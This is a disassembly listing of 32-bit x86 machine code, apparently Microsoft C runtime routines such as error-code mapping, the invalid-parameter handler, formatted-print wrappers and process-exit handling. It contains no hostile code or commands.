  401747:	83 c8 ff             	or     $0xffffffff,%eax
  40174a:	eb 08                	jmp    0x401754
  40174c:	8b 45 08             	mov    0x8(%ebp),%eax
  40174f:	25 ff 00 00 00       	and    $0xff,%eax
  401754:	5f                   	pop    %edi
  401755:	5b                   	pop    %ebx
  401756:	5e                   	pop    %esi
  401757:	c9                   	leave
  401758:	c3                   	ret
  401759:	8b ff                	mov    %edi,%edi
  40175b:	55                   	push   %ebp
  40175c:	8b ec                	mov    %esp,%ebp
  40175e:	8b 45 08             	mov    0x8(%ebp),%eax
  401761:	56                   	push   %esi
  401762:	8b f1                	mov    %ecx,%esi
  401764:	c6 46 0c 00          	movb   $0x0,0xc(%esi)
  401768:	85 c0                	test   %eax,%eax
  40176a:	75 63                	jne    0x4017cf
  40176c:	e8 a8 14 00 00       	call   0x402c19
  401771:	89 46 08             	mov    %eax,0x8(%esi)
  401774:	8b 48 6c             	mov    0x6c(%eax),%ecx
  401777:	89 0e                	mov    %ecx,(%esi)
  401779:	8b 48 68             	mov    0x68(%eax),%ecx
  40177c:	89 4e 04             	mov    %ecx,0x4(%esi)
  40177f:	8b 0e                	mov    (%esi),%ecx
  401781:	3b 0d 28 db 40 00    	cmp    0x40db28,%ecx
  401787:	74 12                	je     0x40179b
  401789:	8b 0d 44 da 40 00    	mov    0x40da44,%ecx
  40178f:	85 48 70             	test   %ecx,0x70(%eax)
  401792:	75 07                	jne    0x40179b
  401794:	e8 dc 2f 00 00       	call   0x404775
  401799:	89 06                	mov    %eax,(%esi)
  40179b:	8b 46 04             	mov    0x4(%esi),%eax
  40179e:	3b 05 48 d9 40 00    	cmp    0x40d948,%eax
  4017a4:	74 16                	je     0x4017bc
  4017a6:	8b 46 08             	mov    0x8(%esi),%eax
  4017a9:	8b 0d 44 da 40 00    	mov    0x40da44,%ecx
  4017af:	85 48 70             	test   %ecx,0x70(%eax)
  4017b2:	75 08                	jne    0x4017bc
  4017b4:	e8 50 28 00 00       	call   0x404009
  4017b9:	89 46 04             	mov    %eax,0x4(%esi)
  4017bc:	8b 46 08             	mov    0x8(%esi),%eax
  4017bf:	f6 40 70 02          	testb  $0x2,0x70(%eax)
  4017c3:	75 14                	jne    0x4017d9
  4017c5:	83 48 70 02          	orl    $0x2,0x70(%eax)
  4017c9:	c6 46 0c 01          	movb   $0x1,0xc(%esi)
  4017cd:	eb 0a                	jmp    0x4017d9
  4017cf:	8b 08                	mov    (%eax),%ecx
  4017d1:	89 0e                	mov    %ecx,(%esi)
  4017d3:	8b 40 04             	mov    0x4(%eax),%eax
  4017d6:	89 46 04             	mov    %eax,0x4(%esi)
  4017d9:	8b c6                	mov    %esi,%eax
  4017db:	5e                   	pop    %esi
  4017dc:	5d                   	pop    %ebp
  4017dd:	c2 04 00             	ret    $0x4
  4017e0:	8b ff                	mov    %edi,%edi
  4017e2:	55                   	push   %ebp
  4017e3:	8b ec                	mov    %esp,%ebp
  4017e5:	8b 45 08             	mov    0x8(%ebp),%eax
  4017e8:	a3 0c df 40 00       	mov    %eax,0x40df0c
  4017ed:	5d                   	pop    %ebp
  4017ee:	c3                   	ret
  4017ef:	8b ff                	mov    %edi,%edi
  4017f1:	55                   	push   %ebp
  4017f2:	8b ec                	mov    %esp,%ebp
  4017f4:	81 ec 28 03 00 00    	sub    $0x328,%esp
  4017fa:	a1 60 db 40 00       	mov    0x40db60,%eax
  4017ff:	33 c5                	xor    %ebp,%eax
  401801:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401804:	83 a5 d8 fc ff ff 00 	andl   $0x0,-0x328(%ebp)
  40180b:	53                   	push   %ebx
  40180c:	6a 4c                	push   $0x4c
  40180e:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  401814:	6a 00                	push   $0x0
  401816:	50                   	push   %eax
  401817:	e8 84 34 00 00       	call   0x404ca0
  40181c:	8d 85 d8 fc ff ff    	lea    -0x328(%ebp),%eax
  401822:	89 85 28 fd ff ff    	mov    %eax,-0x2d8(%ebp)
  401828:	8d 85 30 fd ff ff    	lea    -0x2d0(%ebp),%eax
  40182e:	83 c4 0c             	add    $0xc,%esp
  401831:	89 85 2c fd ff ff    	mov    %eax,-0x2d4(%ebp)
  401837:	89 85 e0 fd ff ff    	mov    %eax,-0x220(%ebp)
  40183d:	89 8d dc fd ff ff    	mov    %ecx,-0x224(%ebp)
  401843:	89 95 d8 fd ff ff    	mov    %edx,-0x228(%ebp)
  401849:	89 9d d4 fd ff ff    	mov    %ebx,-0x22c(%ebp)
  40184f:	89 b5 d0 fd ff ff    	mov    %esi,-0x230(%ebp)
  401855:	89 bd cc fd ff ff    	mov    %edi,-0x234(%ebp)
  40185b:	66 8c 95 f8 fd ff ff 	data16 mov %ss,-0x208(%ebp)
  401862:	66 8c 8d ec fd ff ff 	data16 mov %cs,-0x214(%ebp)
  401869:	66 8c 9d c8 fd ff ff 	data16 mov %ds,-0x238(%ebp)
  401870:	66 8c 85 c4 fd ff ff 	data16 mov %es,-0x23c(%ebp)
  401877:	66 8c a5 c0 fd ff ff 	data16 mov %fs,-0x240(%ebp)
  40187e:	66 8c ad bc fd ff ff 	data16 mov %gs,-0x244(%ebp)
  401885:	9c                   	pushf
  401886:	8f 85 f0 fd ff ff    	pop    -0x210(%ebp)
  40188c:	8b 45 04             	mov    0x4(%ebp),%eax
  40188f:	8d 4d 04             	lea    0x4(%ebp),%ecx
  401892:	c7 85 30 fd ff ff 01 	movl   $0x10001,-0x2d0(%ebp)
  401899:	00 01 00 
  40189c:	89 85 e8 fd ff ff    	mov    %eax,-0x218(%ebp)
  4018a2:	89 8d f4 fd ff ff    	mov    %ecx,-0x20c(%ebp)
  4018a8:	8b 49 fc             	mov    -0x4(%ecx),%ecx
  4018ab:	89 8d e4 fd ff ff    	mov    %ecx,-0x21c(%ebp)
  4018b1:	c7 85 d8 fc ff ff 17 	movl   $0xc0000417,-0x328(%ebp)
  4018b8:	04 00 c0 
  4018bb:	c7 85 dc fc ff ff 01 	movl   $0x1,-0x324(%ebp)
  4018c2:	00 00 00 
  4018c5:	89 85 e4 fc ff ff    	mov    %eax,-0x31c(%ebp)
  4018cb:	ff 15 64 a0 40 00    	call   *0x40a064
  4018d1:	6a 00                	push   $0x0
  4018d3:	8b d8                	mov    %eax,%ebx
  4018d5:	ff 15 60 a0 40 00    	call   *0x40a060
  4018db:	8d 85 28 fd ff ff    	lea    -0x2d8(%ebp),%eax
  4018e1:	50                   	push   %eax
  4018e2:	ff 15 5c a0 40 00    	call   *0x40a05c
  4018e8:	85 c0                	test   %eax,%eax
  4018ea:	75 0c                	jne    0x4018f8
  4018ec:	85 db                	test   %ebx,%ebx
  4018ee:	75 08                	jne    0x4018f8
  4018f0:	6a 02                	push   $0x2
  4018f2:	e8 9e 33 00 00       	call   0x404c95
  4018f7:	59                   	pop    %ecx
  4018f8:	68 17 04 00 c0       	push   $0xc0000417
  4018fd:	ff 15 58 a0 40 00    	call   *0x40a058
  401903:	50                   	push   %eax
  401904:	ff 15 54 a0 40 00    	call   *0x40a054
  40190a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40190d:	33 cd                	xor    %ebp,%ecx
  40190f:	5b                   	pop    %ebx
  401910:	e8 da 32 00 00       	call   0x404bef
  401915:	c9                   	leave
  401916:	c3                   	ret
  401917:	8b ff                	mov    %edi,%edi
  401919:	55                   	push   %ebp
  40191a:	8b ec                	mov    %esp,%ebp
  40191c:	ff 35 0c df 40 00    	push   0x40df0c
  401922:	e8 a6 10 00 00       	call   0x4029cd
  401927:	59                   	pop    %ecx
  401928:	85 c0                	test   %eax,%eax
  40192a:	74 03                	je     0x40192f
  40192c:	5d                   	pop    %ebp
  40192d:	ff e0                	jmp    *%eax
  40192f:	6a 02                	push   $0x2
  401931:	e8 5f 33 00 00       	call   0x404c95
  401936:	59                   	pop    %ecx
  401937:	5d                   	pop    %ebp
  401938:	e9 b2 fe ff ff       	jmp    0x4017ef
  40193d:	8b ff                	mov    %edi,%edi
  40193f:	55                   	push   %ebp
  401940:	8b ec                	mov    %esp,%ebp
  401942:	8b 45 08             	mov    0x8(%ebp),%eax
  401945:	33 c9                	xor    %ecx,%ecx
  401947:	3b 04 cd 10 d0 40 00 	cmp    0x40d010(,%ecx,8),%eax
  40194e:	74 13                	je     0x401963
  401950:	41                   	inc    %ecx
  401951:	83 f9 2d             	cmp    $0x2d,%ecx
  401954:	72 f1                	jb     0x401947
  401956:	8d 48 ed             	lea    -0x13(%eax),%ecx
  401959:	83 f9 11             	cmp    $0x11,%ecx
  40195c:	77 0e                	ja     0x40196c
  40195e:	6a 0d                	push   $0xd
  401960:	58                   	pop    %eax
  401961:	5d                   	pop    %ebp
  401962:	c3                   	ret
  401963:	8b 04 cd 14 d0 40 00 	mov    0x40d014(,%ecx,8),%eax
  40196a:	5d                   	pop    %ebp
  40196b:	c3                   	ret
  40196c:	05 44 ff ff ff       	add    $0xffffff44,%eax
  401971:	6a 0e                	push   $0xe
  401973:	59                   	pop    %ecx
  401974:	3b c8                	cmp    %eax,%ecx
  401976:	1b c0                	sbb    %eax,%eax
  401978:	23 c1                	and    %ecx,%eax
  40197a:	83 c0 08             	add    $0x8,%eax
  40197d:	5d                   	pop    %ebp
  40197e:	c3                   	ret
  40197f:	e8 1c 12 00 00       	call   0x402ba0
  401984:	85 c0                	test   %eax,%eax
  401986:	75 06                	jne    0x40198e
  401988:	b8 78 d1 40 00       	mov    $0x40d178,%eax
  40198d:	c3                   	ret
  40198e:	83 c0 08             	add    $0x8,%eax
  401991:	c3                   	ret
  401992:	e8 09 12 00 00       	call   0x402ba0
  401997:	85 c0                	test   %eax,%eax
  401999:	75 06                	jne    0x4019a1
  40199b:	b8 7c d1 40 00       	mov    $0x40d17c,%eax
  4019a0:	c3                   	ret
  4019a1:	83 c0 0c             	add    $0xc,%eax
  4019a4:	c3                   	ret
  4019a5:	8b ff                	mov    %edi,%edi
  4019a7:	55                   	push   %ebp
  4019a8:	8b ec                	mov    %esp,%ebp
  4019aa:	56                   	push   %esi
  4019ab:	e8 e2 ff ff ff       	call   0x401992
  4019b0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4019b3:	51                   	push   %ecx
  4019b4:	89 08                	mov    %ecx,(%eax)
  4019b6:	e8 82 ff ff ff       	call   0x40193d
  4019bb:	59                   	pop    %ecx
  4019bc:	8b f0                	mov    %eax,%esi
  4019be:	e8 bc ff ff ff       	call   0x40197f
  4019c3:	89 30                	mov    %esi,(%eax)
  4019c5:	5e                   	pop    %esi
  4019c6:	5d                   	pop    %ebp
  4019c7:	c3                   	ret
  4019c8:	8b ff                	mov    %edi,%edi
  4019ca:	55                   	push   %ebp
  4019cb:	8b ec                	mov    %esp,%ebp
  4019cd:	83 ec 20             	sub    $0x20,%esp
  4019d0:	53                   	push   %ebx
  4019d1:	33 db                	xor    %ebx,%ebx
  4019d3:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  4019d6:	75 20                	jne    0x4019f8
  4019d8:	e8 a2 ff ff ff       	call   0x40197f
  4019dd:	53                   	push   %ebx
  4019de:	53                   	push   %ebx
  4019df:	53                   	push   %ebx
  4019e0:	53                   	push   %ebx
  4019e1:	53                   	push   %ebx
  4019e2:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  4019e8:	e8 2a ff ff ff       	call   0x401917
  4019ed:	83 c4 14             	add    $0x14,%esp
  4019f0:	83 c8 ff             	or     $0xffffffff,%eax
  4019f3:	e9 99 00 00 00       	jmp    0x401a91
  4019f8:	56                   	push   %esi
  4019f9:	8b 75 0c             	mov    0xc(%ebp),%esi
  4019fc:	57                   	push   %edi
  4019fd:	8b 7d 10             	mov    0x10(%ebp),%edi
  401a00:	3b fb                	cmp    %ebx,%edi
  401a02:	74 21                	je     0x401a25
  401a04:	3b f3                	cmp    %ebx,%esi
  401a06:	75 1d                	jne    0x401a25
  401a08:	e8 72 ff ff ff       	call   0x40197f
  401a0d:	53                   	push   %ebx
  401a0e:	53                   	push   %ebx
  401a0f:	53                   	push   %ebx
  401a10:	53                   	push   %ebx
  401a11:	53                   	push   %ebx
  401a12:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  401a18:	e8 fa fe ff ff       	call   0x401917
  401a1d:	83 c4 14             	add    $0x14,%esp
  401a20:	83 c8 ff             	or     $0xffffffff,%eax
  401a23:	eb 6a                	jmp    0x401a8f
  401a25:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401a2a:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401a2d:	3b f8                	cmp    %eax,%edi
  401a2f:	77 03                	ja     0x401a34
  401a31:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  401a34:	ff 75 1c             	push   0x1c(%ebp)
  401a37:	8d 45 e0             	lea    -0x20(%ebp),%eax
  401a3a:	ff 75 18             	push   0x18(%ebp)
  401a3d:	c7 45 ec 42 00 00 00 	movl   $0x42,-0x14(%ebp)
  401a44:	ff 75 14             	push   0x14(%ebp)
  401a47:	89 75 e8             	mov    %esi,-0x18(%ebp)
  401a4a:	50                   	push   %eax
  401a4b:	89 75 e0             	mov    %esi,-0x20(%ebp)
  401a4e:	ff 55 08             	call   *0x8(%ebp)
  401a51:	83 c4 10             	add    $0x10,%esp
  401a54:	89 45 14             	mov    %eax,0x14(%ebp)
  401a57:	3b f3                	cmp    %ebx,%esi
  401a59:	74 34                	je     0x401a8f
  401a5b:	3b c3                	cmp    %ebx,%eax
  401a5d:	7c 22                	jl     0x401a81
  401a5f:	ff 4d e4             	decl   -0x1c(%ebp)
  401a62:	78 07                	js     0x401a6b
  401a64:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401a67:	88 18                	mov    %bl,(%eax)
  401a69:	eb 11                	jmp    0x401a7c
  401a6b:	8d 45 e0             	lea    -0x20(%ebp),%eax
  401a6e:	50                   	push   %eax
  401a6f:	53                   	push   %ebx
  401a70:	e8 80 fb ff ff       	call   0x4015f5
  401a75:	59                   	pop    %ecx
  401a76:	59                   	pop    %ecx
  401a77:	83 f8 ff             	cmp    $0xffffffff,%eax
  401a7a:	74 05                	je     0x401a81
  401a7c:	8b 45 14             	mov    0x14(%ebp),%eax
  401a7f:	eb 0e                	jmp    0x401a8f
  401a81:	33 c0                	xor    %eax,%eax
  401a83:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401a86:	88 5c 3e ff          	mov    %bl,-0x1(%esi,%edi,1)
  401a8a:	0f 9d c0             	setge  %al
  401a8d:	48                   	dec    %eax
  401a8e:	48                   	dec    %eax
  401a8f:	5f                   	pop    %edi
  401a90:	5e                   	pop    %esi
  401a91:	5b                   	pop    %ebx
  401a92:	c9                   	leave
  401a93:	c3                   	ret
  401a94:	8b ff                	mov    %edi,%edi
  401a96:	55                   	push   %ebp
  401a97:	8b ec                	mov    %esp,%ebp
  401a99:	53                   	push   %ebx
  401a9a:	33 db                	xor    %ebx,%ebx
  401a9c:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  401a9f:	75 1d                	jne    0x401abe
  401aa1:	e8 d9 fe ff ff       	call   0x40197f
  401aa6:	53                   	push   %ebx
  401aa7:	53                   	push   %ebx
  401aa8:	53                   	push   %ebx
  401aa9:	53                   	push   %ebx
  401aaa:	53                   	push   %ebx
  401aab:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  401ab1:	e8 61 fe ff ff       	call   0x401917
  401ab6:	83 c4 14             	add    $0x14,%esp
  401ab9:	83 c8 ff             	or     $0xffffffff,%eax
  401abc:	eb 5b                	jmp    0x401b19
  401abe:	56                   	push   %esi
  401abf:	8b 75 08             	mov    0x8(%ebp),%esi
  401ac2:	3b f3                	cmp    %ebx,%esi
  401ac4:	74 05                	je     0x401acb
  401ac6:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  401ac9:	77 0d                	ja     0x401ad8
  401acb:	e8 af fe ff ff       	call   0x40197f
  401ad0:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  401ad6:	eb 30                	jmp    0x401b08
  401ad8:	ff 75 18             	push   0x18(%ebp)
  401adb:	ff 75 14             	push   0x14(%ebp)
  401ade:	ff 75 10             	push   0x10(%ebp)
  401ae1:	ff 75 0c             	push   0xc(%ebp)
  401ae4:	56                   	push   %esi
  401ae5:	68 c0 4d 40 00       	push   $0x404dc0
  401aea:	e8 d9 fe ff ff       	call   0x4019c8
  401aef:	83 c4 18             	add    $0x18,%esp
  401af2:	3b c3                	cmp    %ebx,%eax
  401af4:	7d 02                	jge    0x401af8
  401af6:	88 1e                	mov    %bl,(%esi)
  401af8:	83 f8 fe             	cmp    $0xfffffffe,%eax
  401afb:	75 1b                	jne    0x401b18
  401afd:	e8 7d fe ff ff       	call   0x40197f
  401b02:	c7 00 22 00 00 00    	movl   $0x22,(%eax)
  401b08:	53                   	push   %ebx
  401b09:	53                   	push   %ebx
  401b0a:	53                   	push   %ebx
  401b0b:	53                   	push   %ebx
  401b0c:	53                   	push   %ebx
  401b0d:	e8 05 fe ff ff       	call   0x401917
  401b12:	83 c4 14             	add    $0x14,%esp
  401b15:	83 c8 ff             	or     $0xffffffff,%eax
  401b18:	5e                   	pop    %esi
  401b19:	5b                   	pop    %ebx
  401b1a:	5d                   	pop    %ebp
  401b1b:	c3                   	ret
  401b1c:	8b ff                	mov    %edi,%edi
  401b1e:	55                   	push   %ebp
  401b1f:	8b ec                	mov    %esp,%ebp
  401b21:	8b 45 08             	mov    0x8(%ebp),%eax
  401b24:	8b 00                	mov    (%eax),%eax
  401b26:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  401b2c:	75 2a                	jne    0x401b58
  401b2e:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  401b32:	75 24                	jne    0x401b58
  401b34:	8b 40 14             	mov    0x14(%eax),%eax
  401b37:	3d 20 05 93 19       	cmp    $0x19930520,%eax
  401b3c:	74 15                	je     0x401b53
  401b3e:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  401b43:	74 0e                	je     0x401b53
  401b45:	3d 22 05 93 19       	cmp    $0x19930522,%eax
  401b4a:	74 07                	je     0x401b53
  401b4c:	3d 00 40 99 01       	cmp    $0x1994000,%eax
  401b51:	75 05                	jne    0x401b58
  401b53:	e8 38 3e 00 00       	call   0x405990
  401b58:	33 c0                	xor    %eax,%eax
  401b5a:	5d                   	pop    %ebp
  401b5b:	c2 04 00             	ret    $0x4
  401b5e:	68 1c 1b 40 00       	push   $0x401b1c
  401b63:	ff 15 60 a0 40 00    	call   *0x40a060
  401b69:	33 c0                	xor    %eax,%eax
  401b6b:	c3                   	ret
  401b6c:	8b ff                	mov    %edi,%edi
  401b6e:	55                   	push   %ebp
  401b6f:	8b ec                	mov    %esp,%ebp
  401b71:	57                   	push   %edi
  401b72:	bf e8 03 00 00       	mov    $0x3e8,%edi
  401b77:	57                   	push   %edi
  401b78:	ff 15 6c a0 40 00    	call   *0x40a06c
  401b7e:	ff 75 08             	push   0x8(%ebp)
  401b81:	ff 15 68 a0 40 00    	call   *0x40a068
  401b87:	81 c7 e8 03 00 00    	add    $0x3e8,%edi
  401b8d:	81 ff 60 ea 00 00    	cmp    $0xea60,%edi
  401b93:	77 04                	ja     0x401b99
  401b95:	85 c0                	test   %eax,%eax
  401b97:	74 de                	je     0x401b77
  401b99:	5f                   	pop    %edi
  401b9a:	5d                   	pop    %ebp
  401b9b:	c3                   	ret
  401b9c:	8b ff                	mov    %edi,%edi
  401b9e:	55                   	push   %ebp
  401b9f:	8b ec                	mov    %esp,%ebp
  401ba1:	e8 a9 04 00 00       	call   0x40204f
  401ba6:	ff 75 08             	push   0x8(%ebp)
  401ba9:	e8 f6 02 00 00       	call   0x401ea4
  401bae:	ff 35 80 d1 40 00    	push   0x40d180
  401bb4:	e8 14 0e 00 00       	call   0x4029cd
  401bb9:	68 ff 00 00 00       	push   $0xff
  401bbe:	ff d0                	call   *%eax
  401bc0:	83 c4 0c             	add    $0xc,%esp
  401bc3:	5d                   	pop    %ebp
  401bc4:	c3                   	ret
  401bc5:	8b ff                	mov    %edi,%edi
  401bc7:	55                   	push   %ebp
  401bc8:	8b ec                	mov    %esp,%ebp
  401bca:	68 1c a2 40 00       	push   $0x40a21c
  401bcf:	ff 15 68 a0 40 00    	call   *0x40a068
  401bd5:	85 c0                	test   %eax,%eax
  401bd7:	74 15                	je     0x401bee
  401bd9:	68 0c a2 40 00       	push   $0x40a20c
  401bde:	50                   	push   %eax
  401bdf:	ff 15 70 a0 40 00    	call   *0x40a070
  401be5:	85 c0                	test   %eax,%eax
  401be7:	74 05                	je     0x401bee
  401be9:	ff 75 08             	push   0x8(%ebp)
  401bec:	ff d0                	call   *%eax
  401bee:	5d                   	pop    %ebp
  401bef:	c3                   	ret
  401bf0:	8b ff                	mov    %edi,%edi
  401bf2:	55                   	push   %ebp
  401bf3:	8b ec                	mov    %esp,%ebp
  401bf5:	ff 75 08             	push   0x8(%ebp)
  401bf8:	e8 c8 ff ff ff       	call   0x401bc5
  401bfd:	59                   	pop    %ecx
  401bfe:	ff 75 08             	push   0x8(%ebp)
  401c01:	ff 15 74 a0 40 00    	call   *0x40a074
  401c07:	cc                   	int3
  401c08:	6a 08                	push   $0x8
  401c0a:	e8 47 3f 00 00       	call   0x405b56
  401c0f:	59                   	pop    %ecx
  401c10:	c3                   	ret
  401c11:	6a 08                	push   $0x8
  401c13:	e8 64 3e 00 00       	call   0x405a7c
  401c18:	59                   	pop    %ecx
  401c19:	c3                   	ret
  401c1a:	8b ff                	mov    %edi,%edi
  401c1c:	55                   	push   %ebp
  401c1d:	8b ec                	mov    %esp,%ebp
  401c1f:	56                   	push   %esi
  401c20:	8b f0                	mov    %eax,%esi
  401c22:	eb 0b                	jmp    0x401c2f
  401c24:	8b 06                	mov    (%esi),%eax
  401c26:	85 c0                	test   %eax,%eax
  401c28:	74 02                	je     0x401c2c
  401c2a:	ff d0                	call   *%eax
  401c2c:	83 c6 04             	add    $0x4,%esi
  401c2f:	3b 75 08             	cmp    0x8(%ebp),%esi
  401c32:	72 f0                	jb     0x401c24
  401c34:	5e                   	pop    %esi
  401c35:	5d                   	pop    %ebp
  401c36:	c3                   	ret
  401c37:	8b ff                	mov    %edi,%edi
  401c39:	55                   	push   %ebp
  401c3a:	8b ec                	mov    %esp,%ebp
  401c3c:	56                   	push   %esi
  401c3d:	8b 75 08             	mov    0x8(%ebp),%esi
  401c40:	33 c0                	xor    %eax,%eax
  401c42:	eb 0f                	jmp    0x401c53
  401c44:	85 c0                	test   %eax,%eax
  401c46:	75 10                	jne    0x401c58
  401c48:	8b 0e                	mov    (%esi),%ecx
  401c4a:	85 c9                	test   %ecx,%ecx
  401c4c:	74 02                	je     0x401c50
  401c4e:	ff d1                	call   *%ecx
  401c50:	83 c6 04             	add    $0x4,%esi
  401c53:	3b 75 0c             	cmp    0xc(%ebp),%esi
  401c56:	72 ec                	jb     0x401c44
  401c58:	5e                   	pop    %esi
  401c59:	5d                   	pop    %ebp
  401c5a:	c3                   	ret
  401c5b:	8b ff                	mov    %edi,%edi
  401c5d:	55                   	push   %ebp
  401c5e:	8b ec                	mov    %esp,%ebp
  401c60:	83 3d d0 fa 40 00 00 	cmpl   $0x0,0x40fad0
  401c67:	74 19                	je     0x401c82
  401c69:	68 d0 fa 40 00       	push   $0x40fad0
  401c6e:	e8 ed 40 00 00       	call   0x405d60
  401c73:	59                   	pop    %ecx
  401c74:	85 c0                	test   %eax,%eax
  401c76:	74 0a                	je     0x401c82
  401c78:	ff 75 08             	push   0x8(%ebp)
  401c7b:	ff 15 d0 fa 40 00    	call   *0x40fad0
  401c81:	59                   	pop    %ecx
  401c82:	e8 f2 2b 00 00       	call   0x404879
  401c87:	68 7c a1 40 00       	push   $0x40a17c
  401c8c:	68 64 a1 40 00       	push   $0x40a164
  401c91:	e8 a1 ff ff ff       	call   0x401c37
  401c96:	59                   	pop    %ecx
  401c97:	59                   	pop    %ecx
  401c98:	85 c0                	test   %eax,%eax
  401c9a:	75 42                	jne    0x401cde
  401c9c:	68 2c 29 40 00       	push   $0x40292c
  401ca1:	e8 0a 40 00 00       	call   0x405cb0
  401ca6:	b8 5c a1 40 00       	mov    $0x40a15c,%eax
  401cab:	c7 04 24 60 a1 40 00 	movl   $0x40a160,(%esp)
  401cb2:	e8 63 ff ff ff       	call   0x401c1a
  401cb7:	83 3d d4 fa 40 00 00 	cmpl   $0x0,0x40fad4
  401cbe:	59                   	pop    %ecx
  401cbf:	74 1b                	je     0x401cdc
  401cc1:	68 d4 fa 40 00       	push   $0x40fad4
  401cc6:	e8 95 40 00 00       	call   0x405d60
  401ccb:	59                   	pop    %ecx
  401ccc:	85 c0                	test   %eax,%eax
  401cce:	74 0c                	je     0x401cdc
  401cd0:	6a 00                	push   $0x0
  401cd2:	6a 02                	push   $0x2
  401cd4:	6a 00                	push   $0x0
  401cd6:	ff 15 d4 fa 40 00    	call   *0x40fad4
  401cdc:	33 c0                	xor    %eax,%eax
  401cde:	5d                   	pop    %ebp
  401cdf:	c3                   	ret
  401ce0:	6a 18                	push   $0x18
  401ce2:	68 98 b5 40 00       	push   $0x40b598
  401ce7:	e8 34 12 00 00       	call   0x402f20
  401cec:	6a 08                	push   $0x8
  401cee:	e8 63 3e 00 00       	call   0x405b56
  401cf3:	59                   	pop    %ecx
  401cf4:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  401cf8:	33 db                	xor    %ebx,%ebx
  401cfa:	43                   	inc    %ebx
  401cfb:	39 1d 40 df 40 00    	cmp    %ebx,0x40df40
  401d01:	0f 84 c5 00 00 00    	je     0x401dcc
  401d07:	89 1d 3c df 40 00    	mov    %ebx,0x40df3c
  401d0d:	8a 45 10             	mov    0x10(%ebp),%al
  401d10:	a2 38 df 40 00       	mov    %al,0x40df38
  401d15:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  401d19:	0f 85 9d 00 00 00    	jne    0x401dbc
  401d1f:	ff 35 c8 fa 40 00    	push   0x40fac8
  401d25:	e8 a3 0c 00 00       	call   0x4029cd
  401d2a:	59                   	pop    %ecx
  401d2b:	8b f8                	mov    %eax,%edi
  401d2d:	89 7d d8             	mov    %edi,-0x28(%ebp)
  401d30:	85 ff                	test   %edi,%edi
  401d32:	74 78                	je     0x401dac
  401d34:	ff 35 c4 fa 40 00    	push   0x40fac4
  401d3a:	e8 8e 0c 00 00       	call   0x4029cd
  401d3f:	59                   	pop    %ecx
  401d40:	8b f0                	mov    %eax,%esi
  401d42:	89 75 dc             	mov    %esi,-0x24(%ebp)
  401d45:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  401d48:	89 75 e0             	mov    %esi,-0x20(%ebp)
  401d4b:	83 ee 04             	sub    $0x4,%esi
  401d4e:	89 75 dc             	mov    %esi,-0x24(%ebp)
  401d51:	3b f7                	cmp    %edi,%esi
  401d53:	72 57                	jb     0x401dac
  401d55:	e8 6a 0c 00 00       	call   0x4029c4
  401d5a:	39 06                	cmp    %eax,(%esi)
  401d5c:	74 ed                	je     0x401d4b
  401d5e:	3b f7                	cmp    %edi,%esi
  401d60:	72 4a                	jb     0x401dac
  401d62:	ff 36                	push   (%esi)
  401d64:	e8 64 0c 00 00       	call   0x4029cd
  401d69:	8b f8                	mov    %eax,%edi
  401d6b:	e8 54 0c 00 00       	call   0x4029c4
  401d70:	89 06                	mov    %eax,(%esi)
  401d72:	ff d7                	call   *%edi
  401d74:	ff 35 c8 fa 40 00    	push   0x40fac8
  401d7a:	e8 4e 0c 00 00       	call   0x4029cd
  401d7f:	8b f8                	mov    %eax,%edi
  401d81:	ff 35 c4 fa 40 00    	push   0x40fac4
  401d87:	e8 41 0c 00 00       	call   0x4029cd
  401d8c:	83 c4 0c             	add    $0xc,%esp
  401d8f:	39 7d e4             	cmp    %edi,-0x1c(%ebp)
  401d92:	75 05                	jne    0x401d99
  401d94:	39 45 e0             	cmp    %eax,-0x20(%ebp)
  401d97:	74 0e                	je     0x401da7
  401d99:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  401d9c:	89 7d d8             	mov    %edi,-0x28(%ebp)
  401d9f:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401da2:	8b f0                	mov    %eax,%esi
  401da4:	89 75 dc             	mov    %esi,-0x24(%ebp)
  401da7:	8b 7d d8             	mov    -0x28(%ebp),%edi
  401daa:	eb 9f                	jmp    0x401d4b
  401dac:	68 8c a1 40 00       	push   $0x40a18c
  401db1:	b8 80 a1 40 00       	mov    $0x40a180,%eax
  401db6:	e8 5f fe ff ff       	call   0x401c1a
  401dbb:	59                   	pop    %ecx
  401dbc:	68 94 a1 40 00       	push   $0x40a194
  401dc1:	b8 90 a1 40 00       	mov    $0x40a190,%eax
  401dc6:	e8 4f fe ff ff       	call   0x401c1a
  401dcb:	59                   	pop    %ecx
  401dcc:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  401dd3:	e8 1f 00 00 00       	call   0x401df7
  401dd8:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  401ddc:	75 28                	jne    0x401e06
  401dde:	89 1d 40 df 40 00    	mov    %ebx,0x40df40
  401de4:	6a 08                	push   $0x8
  401de6:	e8 91 3c 00 00       	call   0x405a7c
  401deb:	59                   	pop    %ecx
  401dec:	ff 75 08             	push   0x8(%ebp)
  401def:	e8 fc fd ff ff       	call   0x401bf0
  401df4:	33 db                	xor    %ebx,%ebx
  401df6:	43                   	inc    %ebx
  401df7:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  401dfb:	74 08                	je     0x401e05
  401dfd:	6a 08                	push   $0x8
  401dff:	e8 78 3c 00 00       	call   0x405a7c
  401e04:	59                   	pop    %ecx
  401e05:	c3                   	ret
